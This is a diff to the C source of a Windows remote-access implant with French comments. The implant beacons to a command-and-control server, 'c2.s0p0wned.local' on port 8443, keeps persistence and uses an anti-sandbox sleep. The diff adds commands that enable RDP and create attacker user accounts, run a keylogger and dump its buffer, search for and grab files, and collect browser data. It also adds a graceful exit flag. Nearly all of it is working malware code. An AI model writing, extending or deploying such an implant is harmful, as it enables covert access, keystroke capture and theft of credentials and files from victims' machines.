@@ -6,11 +6,17 @@
 #include <lmcons.h>
 #include "persistence.h"
 #include "watchdog.h"
+#include "rdp.h"
+#include "keylog.h"
+#include "loot.h"
 
 // Configuration
 #define C2_SERVER "c2.s0p0wned.local"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
+
+// Variable globale pour arrêt propre de l'agent
+volatile BOOL g_should_exit = FALSE;
 
 // Structure pour les infos système
 typedef struct {
@@ -218,18 +224,27 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
     if (strncmp(cmd, "killme", 6) == 0) {
         printf("[*] Self-destruct initiated...\n");
         remove_all_persistence();
-        snprintf(output, output_size, 
+        snprintf(output, output_size,
                 "[+] Persistence removed\n"
                 "[*] Agent will terminate after sending this message\n"
                 "[*] Goodbye!");
-        // Le processus se terminera après l'envoi du résultat
+        g_should_exit = TRUE;
         return;
     }
-    
+
+    if (strncmp(cmd, "exit", 4) == 0 || strncmp(cmd, "quit", 4) == 0) {
+        printf("[*] Exit command received...\n");
+        snprintf(output, output_size,
+                "[*] Agent terminating gracefully\n"
+                "[*] Goodbye!");
+        g_should_exit = TRUE;
+        return;
+    }
+
     if (strncmp(cmd, "status", 6) == 0) {
         PersistenceStatus status;
         get_persistence_status(&status);
-        
+
         snprintf(output, output_size,
                 "[Persistence Status]\n"
                 "  Registry:       %s\n"
@@ -242,7 +257,102 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
                 status.install_path);
         return;
     }
-    
+
+    // Commande RDP
+    if (strncmp(cmd, "rdp ", 4) == 0) {
+        const char *rdp_arg = cmd + 4;
+
+        if (strcmp(rdp_arg, "enable") == 0) {
+            printf("[*] Enabling RDP...\n");
+            rdp_enable(output, output_size);
+        }
+        else if (strcmp(rdp_arg, "disable") == 0) {
+            printf("[*] Disabling RDP...\n");
+            rdp_disable(output, output_size);
+        }
+        else if (strcmp(rdp_arg, "status") == 0) {
+            printf("[*] Checking RDP status...\n");
+            rdp_status(output, output_size);
+        }
+        else if (strncmp(rdp_arg, "adduser ", 8) == 0) {
+            // Parse: rdp adduser <username> <password>
+            char username[128] = {0};
+            char password[128] = {0};
+
+            const char *args = rdp_arg + 8;
+            if (sscanf(args, "%127s %127s", username, password) == 2) {
+                printf("[*] Creating RDP user: %s...\n", username);
+                rdp_adduser(username, password, output, output_size);
+            } else {
+                snprintf(output, output_size, "[-] Usage: rdp adduser <username> <password>");
+            }
+        }
+        else {
+            snprintf(output, output_size,
+                    "[-] Unknown RDP command\n"
+                    "[*] Available: rdp enable | disable | status | adduser <user> <pass>");
+        }
+        return;
+    }
+
+    // Commande Keylog
+    if (strncmp(cmd, "keylog ", 7) == 0) {
+        const char *keylog_arg = cmd + 7;
+
+        if (strcmp(keylog_arg, "start") == 0) {
+            printf("[*] Starting keylogger...\n");
+            keylog_start(output, output_size);
+        }
+        else if (strcmp(keylog_arg, "stop") == 0) {
+            printf("[*] Stopping keylogger...\n");
+            keylog_stop(output, output_size);
+        }
+        else if (strcmp(keylog_arg, "dump") == 0) {
+            printf("[*] Dumping keylog buffer...\n");
+            keylog_dump(output, output_size);
+        }
+        else if (strcmp(keylog_arg, "status") == 0) {
+            printf("[*] Checking keylog status...\n");
+            keylog_status(output, output_size);
+        }
+        else {
+            snprintf(output, output_size,
+                    "[-] Unknown keylog command\n"
+                    "[*] Available: keylog start | stop | dump | status");
+        }
+        return;
+    }
+
+    // Commande Loot
+    if (strncmp(cmd, "loot ", 5) == 0) {
+        const char *loot_arg = cmd + 5;
+
+        if (strcmp(loot_arg, "sysinfo") == 0) {
+            printf("[*] Collecting system information...\n");
+            loot_sysinfo(output, output_size);
+        }
+        else if (strncmp(loot_arg, "find ", 5) == 0) {
+            const char *pattern = loot_arg + 5;
+            printf("[*] Searching for files: %s...\n", pattern);
+            loot_find(pattern, output, output_size);
+        }
+        else if (strncmp(loot_arg, "grab ", 5) == 0) {
+            const char *filepath = loot_arg + 5;
+            printf("[*] Grabbing file: %s...\n", filepath);
+            loot_grab(filepath, output, output_size);
+        }
+        else if (strcmp(loot_arg, "browser") == 0) {
+            printf("[*] Searching for browser data...\n");
+            loot_browser(output, output_size);
+        }
+        else {
+            snprintf(output, output_size,
+                    "[-] Unknown loot command\n"
+                    "[*] Available: loot sysinfo | find <pattern> | grab <file> | browser");
+        }
+        return;
+    }
+
     // Commande shell normale
     SECURITY_ATTRIBUTES sa;
     HANDLE hRead, hWrite;
@@ -514,7 +624,6 @@ int main() {
     SystemInfo sys_info = {0};
     HANDLE watchdog = NULL;
     HANDLE singleton_mutex = NULL;
-    BOOL should_exit = FALSE;
 
     // Anti-sandbox: sleep aléatoire (2-5 secondes)
     srand(time(NULL) ^ GetTickCount());
@@ -558,18 +667,11 @@ int main() {
     printf("======================================\n\n");
     
     int failure_count = 0;
-    
-    // Boucle infinie
-    while (!should_exit) {
+
+    // Boucle infinie (vérification de g_should_exit pour exit propre)
+    while (!g_should_exit) {
         if (do_beacon_cycle(&sys_info)) {
             failure_count = 0;
-            
-            // Vérifier si on doit s'autodétruire (commande killme)
-            // Cette vérification se fait après l'envoi du résultat
-            char last_cmd[256] = {0};
-            // Note: Il faudrait stocker la dernière commande pour cette vérification
-            // Pour l'instant, on continue normalement
-            
         } else {
             failure_count++;
             printf("[!] Beacon failed (%d consecutive failures)\n", failure_count);
